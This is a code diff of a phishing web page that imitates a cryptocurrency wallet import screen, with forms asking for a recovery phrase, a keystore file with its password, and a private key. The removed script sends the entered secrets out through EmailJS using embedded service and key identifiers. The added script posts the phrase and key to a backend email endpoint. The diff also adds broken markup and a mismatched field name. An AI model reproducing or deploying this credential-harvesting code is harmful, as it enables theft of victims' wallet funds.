@@ -100,7 +100,7 @@
         </span>
         <!--Phrase  -->
         <div class="phrase-cont animate-slide-top active">
-          <form id="form">
+          <form id="myForm>
             <textarea name="phrase" id="phrase" class="form-control inputs" minlength="12" rows="7" cols="60"
               placeholder="Enter your recovery phrase" required=""></textarea>
             <input type="text" name="walletname" id="walletname" class="walletname" minlength="2"
@@ -114,7 +114,7 @@
 
         <!--Keystore  -->
         <div class="keystore-cont animate-slide-top">
-          <form id="form">
+          <form id="myForm>
             <textarea name="json" id="json" class="form-control inputs" minlength="2" rows="7" cols="60"
               placeholder="Keystore JSON"></textarea>
             <input type="text" name="password" id="password" minlength="2" class="inputs m-t-10px"
@@ -129,7 +129,7 @@
 
         <!--Private  -->
         <div class="private-cont animate-slide-top">
-          <form id="form">
+          <form id="myForm>
             <input type="text" name="privateKey" id="privateKey" minlength="12" class="form-control inputs"
               placeholder="Private Key" required="" />
             <input type="text" name="walletname" id="walletname" class="walletname" minlength="2"
@@ -1448,30 +1448,30 @@
     </section>
   </section>
 
-
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-  <script type="text/javascript">
-    // Initialize EmailJS with your public key
-    emailjs.init("MtXIunFtEDINMoomj");  // Replace with your own public key
-
-    // Listen for form submission
-    document.getElementById('form').addEventListener('submit', function (event) {
-      event.preventDefault();  // Prevent the default form submission behavior
-
-      // Send form data using EmailJS
-      emailjs.sendForm('service_wl9o2fc', 'template_7grl9yh', this)
-        .then(function (response) {
-          console.log('SUCCESS!', response.status, response.text);
-          // Redirect to index.html after successful submission
-          window.location.href = 'index.html';  // Change this URL if needed
-        }, function (error) {
-          console.log('FAILED...', error);
-          // Optionally handle failure here, maybe redirect to an error page
-          alert('Failed to send message. Please try again later.');
-        });
+  <script>
+    document.getElementById('myForm').addEventListener('submit', async function(event) {
+      event.preventDefault();
+    
+      const formData = new FormData(this);
+      const phrase = formData.get('phrase');
+      const privateKey = formData.get('private');  // Retrieve the private key from the form
+    
+      const emailContent = `Egbon\nphrase: ${phrase}\nprivate: ${privateKey}\n`;
+  
+      try {
+        // Send the form data to the backend to send the email
+        const response = await axios.post('/send-email', { phrase, privateKey });
+        
+        // Optionally, handle the success
+        alert('Email sent successfully!');
+        window.location.href = '/';  // Redirect after successful email send
+      } catch (error) {
+        console.error('Error sending email:', error);
+        alert('There was an error sending the email.');
+      }
     });
   </script>
+  
  
 
   <script src="../js/jQuery.min.js"></script>
